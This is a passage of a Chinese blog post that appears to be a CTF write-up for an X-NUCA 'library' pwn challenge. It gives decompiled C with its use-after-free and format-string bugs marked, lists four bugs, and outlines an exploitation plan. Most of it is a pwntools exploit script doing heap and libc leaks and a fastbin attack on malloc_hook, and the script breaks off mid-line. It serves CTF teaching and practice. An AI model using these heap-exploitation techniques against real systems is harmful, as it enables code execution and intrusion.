= v1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"delete success"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( head-&gt;next == v2 )                     </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(v1);                                 </span><br><span class="line">      head-&gt;next = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2-&gt;next = v1-&gt;next;</span><br><span class="line">      <span class="built_in">free</span>(v1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_11:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Sorry,no such book"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>学生可以借书、还书和读书。</p>
+<p>borrow在book_node的链表中找到对应的书并把borrow字段置为1.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">borrow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ……</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"what's the book's title you want to borrow?"</span>);</span><br><span class="line">  v0 = (<span class="keyword">unsigned</span> __int64)read(<span class="number">0</span>, v4, <span class="number">0x10</span>uLL) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4[v0] == <span class="number">10</span> )</span><br><span class="line">    v4[v0] = <span class="number">0</span>;</span><br><span class="line">  v1 = head;</span><br><span class="line">  v2 = head-&gt;next;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(v4, v2-&gt;title) || LODWORD(v2-&gt;borrow) )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = v2-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    LODWORD(v2-&gt;borrow) = <span class="number">1</span>;</span><br><span class="line">    --LODWORD(v1-&gt;num);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"borrow success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Sorry,Please borrow this book next time"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>back会检查section的数量，如果数量有问题就会释放book_node和对应的section_addr；否则将borrow置零。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">back</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ……</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"what's the book's title you want to give back?"</span>);</span><br><span class="line">  v0 = (<span class="keyword">unsigned</span> __int64)read(<span class="number">0</span>, v7, <span class="number">0x10</span>uLL) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7[v0] == <span class="number">10</span> )</span><br><span class="line">    v7[v0] = <span class="number">0</span>;</span><br><span class="line">  v1 = head;</span><br><span class="line">  v2 = head-&gt;next;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(v7, v2-&gt;title) || LODWORD(v2-&gt;borrow) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = v2-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = v2-&gt;section_addr;</span><br><span class="line">    v4 = v3-&gt;section_list;</span><br><span class="line">    <span class="comment">//统计section_list中的section数量</span></span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        v4 = v4-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v4 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//比较实际的section数量是否和section_addr中的num相同</span></span><br><span class="line">    <span class="keyword">if</span> ( LODWORD(v3-&gt;section_num) == v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v2-&gt;borrow) = <span class="number">0</span>;</span><br><span class="line">      ++LODWORD(v1-&gt;num);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"OK, success!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"section lack!! MUST discard it!!"</span>, v2);</span><br><span class="line">      <span class="built_in">free</span>(v2-&gt;section_addr);                   <span class="comment">// UAF</span></span><br><span class="line">      <span class="built_in">free</span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>read_book会输出name为’xnuca’的section的content，还允许向书中添加section。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">read_book</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  </span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"what's the book's title you want to read at library?"</span>);</span><br><span class="line">  v0 = (<span class="keyword">unsigned</span> __int64)read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( buf[v0] == <span class="number">10</span> )</span><br><span class="line">    buf[v0] = <span class="number">0</span>;</span><br><span class="line">  v1 = head-&gt;next;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(buf, v1-&gt;title) )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = v1-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> ( !v1 )</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"reading..."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"reading..."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"reading..."</span>);</span><br><span class="line">    v2 = v1-&gt;section_addr-&gt;section_list;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = v2 == <span class="number">0L</span>L; v2; i = v2 == <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="string">"xnuca"</span>;</span><br><span class="line">      v6 = <span class="number">5L</span>L;</span><br><span class="line">      v7 = v2;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;<span class="comment">//逐字节比较name</span></span><br><span class="line">        <span class="keyword">if</span> ( !v6 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v3 = v7-&gt;name[<span class="number">0</span>] &lt; (<span class="keyword">const</span> <span class="keyword">unsigned</span> __int8)*v5;</span><br><span class="line">        i = v7-&gt;name[<span class="number">0</span>] == *v5;</span><br><span class="line">        v7 = (struct section_node *)((<span class="keyword">char</span> *)v7 + <span class="number">1</span>);</span><br><span class="line">        ++v5;</span><br><span class="line">        --v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i );</span><br><span class="line">      <span class="keyword">if</span> ( (!v3 &amp;&amp; !i) == v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(v2-&gt;content_addr, v7);           <span class="comment">// format string!</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"xnuca!xnuca!xnuca!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v2-&gt;next;</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"DO you want to take a note?"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v9, <span class="number">2u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( (v9 &amp; <span class="number">0xDF</span>) == <span class="number">0x59</span> )</span><br><span class="line">      input_section(v1-&gt;section_addr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="bugs"><a href="#bugs" class="headerlink" title="bugs"></a>bugs</h3><p>线下的题目漏洞总是很多，利用方式也多样，这里列出我找到的一些洞（反正补过之后没再被打</p>
+<p>1.input_section中，如果type==1，read时的第三个参数变成2*length，造成堆溢出。</p>
+<p>2.check_books中，当abs_title和计算结果不一致时会输出该book_node的title，但如果没有\0，就能够一直输出，通过构造数据能够输出next字段的值，即泄露堆地址。</p>
+<p>3.如果在read_books时能添section，那么在back时，这个book_node和对应的section_addr就会被释放，但没有对指针置零，导致UAF。</p>
+<p>4.read_book中有一个格式化字符串漏洞，但是太明显了，估计很快会被补上，于是不打算用这个漏洞。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用整体思路是利用fastbin attack将malloc_hook-0x23放入到fastbin中，进而覆写malloc_hook。因此需要0x70的块，但程序中唯一能够申请0x70大小的content并不会被释放，所以利用堆溢出修改size字段来伪造0x70的块，至少需要2块才能实现fastbin attack。</p>
+<p>另外需要泄露libc的地址，进而得到malloc_hook的地址。泄露libc地址可以通过check_books中输出title来实现。如果能让book_node指向bss上的stdout，那么输出的title就是stdout的实际地址。为了让book_node指向stdout处，可以修改某一book_node的next字段为bss上的stdout地址。修改字段可以通过UAF漏洞，在back()函数释放book_node和section_addr后，再read_book()添加section，将有机会分配到刚释放的book_node，通过输入content覆写book_node各个字段即可。</p>
+<p>在覆写book_node的过程中，为了其他功能正常进行，section_addr字段要填入正确的堆地址，因此在此之前还需要泄露一次堆地址。</p>
+<p>最终利用思路是：利用check_book和UAF泄露堆地址-&gt;利用check_book和UAF泄露libc地址-&gt;利用fastbin attack覆写malloc_hook。</p>
+<h3 id="利用脚本-2"><a href="#利用脚本-2" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">gadget=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./library'</span>)</span><br><span class="line">	libc= ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(title,section_num,section_name,length,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"title:\n"</span>,title)</span><br><span class="line">	p.sendlineafter(<span class="string">"How many sections\n"</span>,str(section_num))</span><br><span class="line">	p.sendlineafter(<span class="string">"input section name\n"</span>,section_name)</span><br><span class="line">	p.sendlineafter(<span class="string">"what's the section length:\n"</span>,str(length))</span><br><span class="line">	p.sendlineafter(<span class="string">"what's the section content:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(title)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendafter(<span class="string">"title:\n"</span>,title)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_book</span><span class="params">(title,flag1,flag2,section_name=<span class="number">0</span>,length=<span class="number">0</span>,content=<span class="number">0</span>)</span>:</span></span><br><span class="line">	data = <span class="number">0</span></span><br><span class="line">	p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"what's the book's title you want to read at library?\n"</span>,title)</span><br><span class="line">	p.recvuntil(<span class="string">"reading...\n"</span>*<span class="number">3</span>)</span><br><span class="line">	<span class="keyword">if</span> flag1:</span><br><span class="line">		data = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">	<span class="keyword">if</span> flag2:</span><br><span class="line">		p.sendlineafter(<span class="string">"DO you want to take a note?\n"</span>,<span class="string">'Y'</span>)</span><br><span class="line">		p.sendlineafter(<span class="string">"input section name\n"</span>,section_name)</span><br><span class="line">		p.sendlineafter(<span class="string">"what's the section length:\n"</span>,str(length))</span><br><span class="line">		p.sendafter(<span class="string">"what's the section content:\n"</span>,content)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendlineafter(<span class="string">"DO you want to take a note?\n"</span>,<span class="string">'N'</span>)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrow</span><span class="params">(title)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"what's the book's title you want to borrow?\n"</span>,title)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span><span class="params">(title)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"what's the book's title you want to give back?\n"</span>,title)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choose your id:\n"</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="string">'book0'</span>,<span class="number">1</span>,<span class="string">'xnuca'</span>,<span class="number">256</span>,<span class="string">'%17$p'</span>)<span class="comment">#add 0</span></span><br><span class="line">add(<span class="string">'book1'</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">256</span>,<span class="string">'chapter1'</span>)<span class="comment">#add 1</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#leak heap address</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line">p.sendlineafter(<span class="string">"choose your id:\n"</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">read_book(<span class="string">'book1'</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x30</span>,<span class="string">'chapter\n'</span>) <span class="comment">#read_book 1 ;add section</span></span><br><span class="line">borrow(<span class="string">'book1'</span>)</span><br><span class="line">back(<span class="string">'book1'</span>) <span class="comment">#free #1's book_node,section_head</span></span><br><span class="line">read_book(<span class="string">'\x00'</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x38</span>,<span class="string">'1'</span>*<span class="number">40</span>)<span class="comment">#new content use #1's booknode</span></span><br><span class="line">p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#----------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choose your id:\n"</span>,<span class="string">'0'</span>)</span><br><span class="line">check()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Oh,"</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>][<span class="number">40</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'heap_addr:%#x'</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'book2'</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">256</span>,<span class="string">'chapter1'</span>)<span class="comment">#add 2</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc address</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line">p.sendlineafter(<span class="string">"choose your id:\n"</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">read_book(<span class="string">'book2'</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x30</span>,<span class="string">'chapter\n'</span>) <span class="comment">#read_book 2 ;add section</span></span><br><span class="line">borrow(<span class="string">'book2'</span>)</span><br><span class="line">back(<span class="string">'book2'</span>) <span class="comment">#free #2's book_node,section_head</span></span><br><span class="line"></span><br><span class="line">read_book(<span class="string">'\x00'</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x38</span>,<span class="string">'1'</span>.ljust(<span class="number">16</span>,<span class="string">'\x00'</span>)+p64(<span class="number">1</span>)+p64(heap_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x603150</span>))<span class="comment">#new content use #2's booknode</span></span><br><span class="line">p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#----------------------------------------------------------</span></span><br><span class="line">p.sendlineafter(<span class="string">"choose your id:\n"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">check()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Oh,"</span>)</span><br><span class="line">stdout = u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'stdout:%#x'</span>,stdout)</span><br><span class="line">libc_addr = stdout-libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">malloc_hook = libc_addr+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">'\x32'</span>,<span class="number">1</span>,<span class="string">'xnuca'</span>,<span class="number">256</span>,<span class="string">'%17$p'</span>)<span class="comment">#add 0</span></span><br><span class="line">add(<span class="string">'book1'</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">256</span>,<span class="string">'1'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>))<span class="comment">#add 1</span></span><br><span class="line">add(<span class="string">'\x32'</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">256</span>,<span class="string">'1'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>))<span class="comment">#add 2</span></span><br><span class="line">add(<span class="string">'book3'</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">256</span>,<span class="string">'1'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>))<span class="comment">#add 3</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"4. exit\n"</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choose your id:\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">read_book(<span class="string">'book1'</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x30</span>,<span class="string">'chapter'</span>) <span class="comment">#read_book 1;add section</span></span><br><span class="line">borrow(<span class="string">'book1'</span>)</span><br><span class="line">back(<span class="string">'book1'</span>) <span class="comment">#free #1's book_node,section_head</span></span><br><span class="line">read_book(<span class="string">'\x32'</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x38</span>,<span class="string">'1'</span>.ljust(<span class="number">16</span>,<span class="string">'\x00'</span>)+p64(<span class="number">1</span>)+p64(heap_addr+<span class="number">0x7c0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x71</span>))<span class="comment">#change #1 section_head's size to 0x71</span></span><br><span class="line"></span><br><span class="line">back(<span class="string">'1'</span>)<span class="comment">#fastbin 0x70-&gt;#1 section_head;fastbin 0x20-&gt;#1 section_head</span></span><br><span class="line"></span><br><span class="line">read_book(<span class="string">'book3'</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x30</span>,<span class="string">'chapter'</span>) <span class="comment">#read_book 2;add section</span></span><br><span class="line">borrow(<span class="string">'book3'</span>)</span><br><span class="line">back(<span class="string">'book3'</span>) <span class="comment">#free #3's book_node,section_head</span></span><br><span class="line"></span><br><span class="line">read_book(<span class="string">'\x32'</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x38</span>,<span class="string">'0'</span>.ljust(<span class="number">16</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0xb00</span>)+p64(<span class="number">1</span>)+p64(heap_addr+<span class="number">0x7c0</span><span class="number">-0x40</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">back(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">back(<span class="string">'chapter'</span>)<span class="comment">#fastbin 0x70-&gt;#1 section_head-&gt;#3 section_head-&gt;#1 section_head</span></span><br><span class="line"></span><br><span class="line">read_book(<span class="string">'\x00'</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">'sec1'</span>,<span class="number">0x68</span>,p64(malloc_hook<span class="number">-0x23</span>))<span class="comment">#fastbin 0x70-&gt;#3 section_head-&gt;#1 section_head-&gt;malloc_hook-0x23</span></span><br><span class="line">read_book(<span class="string">'\x00'</span>,<span 